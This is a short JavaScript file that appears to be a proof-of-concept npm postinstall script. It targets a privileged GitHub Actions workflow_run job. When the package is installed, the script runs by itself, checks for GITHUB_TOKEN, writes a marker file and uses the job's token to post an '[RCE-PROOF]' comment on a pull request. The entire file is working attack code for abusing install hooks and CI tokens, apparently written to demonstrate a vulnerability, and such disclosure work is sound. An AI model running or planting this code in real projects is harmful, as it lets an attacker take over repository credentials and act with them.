const fs = require('fs');
console.log('ADP_DEP_POSTINSTALL_EXECUTED');
console.log('TOKEN_PRESENT=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
fs.writeFileSync('/tmp/ADP_DEP_MARKER', 'dep-postinstall-ran');
(async () => {
  try {
    const repo = process.env.GITHUB_REPOSITORY;
    const owner = repo.split('/')[0];
    const headers = {
      authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
      accept: 'application/vnd.github+json',
      'user-agent': 'poc'
    };
    const r = await fetch(`https://api.github.com/repos/${repo}/pulls?state=open&head=${owner}:poc-adp-lint-rce-final`, { headers });
    const prs = await r.json();
    const pr = Array.isArray(prs) && prs[0] ? prs[0].number : null;
    console.log('FOUND_PR=' + pr);
    if (pr) {
      const c = await fetch(`https://api.github.com/repos/${repo}/issues/${pr}/comments`, {
        method: 'POST', headers,
        body: JSON.stringify({ body: '[RCE-PROOF] Attacker-controlled npm postinstall executed inside the privileged workflow_run job and used the job GITHUB_TOKEN (pull-requests: write).' })
      });
      console.log('COMMENT_STATUS=' + c.status);
    }
  } catch (e) { console.log('ERR=' + e.message); }
})();
